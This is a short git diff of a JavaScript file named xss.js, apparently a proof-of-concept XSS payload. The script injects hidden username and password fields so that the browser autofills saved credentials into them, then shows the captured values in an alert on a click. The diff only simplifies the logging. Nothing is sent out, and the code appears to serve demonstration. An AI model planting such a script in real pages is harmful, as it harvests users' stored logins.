@@ -1,4 +1,4 @@
-console.log('>  xss.js:1 >  ');
+console.log('Loaded XSS script');
 const usernameEl = document.createElement('input');
 usernameEl.name = 'username';
 usernameEl.hidden = true;
@@ -11,10 +11,5 @@ passwordEl.hidden = true;
 document.body.appendChild(passwordEl);
 
 window.addEventListener('click', () => {
-    if (passwordEl.value) {
-        console.log(` username: ${usernameEl.value}\n password: ${passwordEl.value}`);
-        alert(` username: ${usernameEl.value}\n password: ${passwordEl.value}`);
-    } else {
-        alert('Could not get your password :(');
-    }
+    if (passwordEl.value) alert(` username: ${usernameEl.value}\n password: ${passwordEl.value}`);
 });
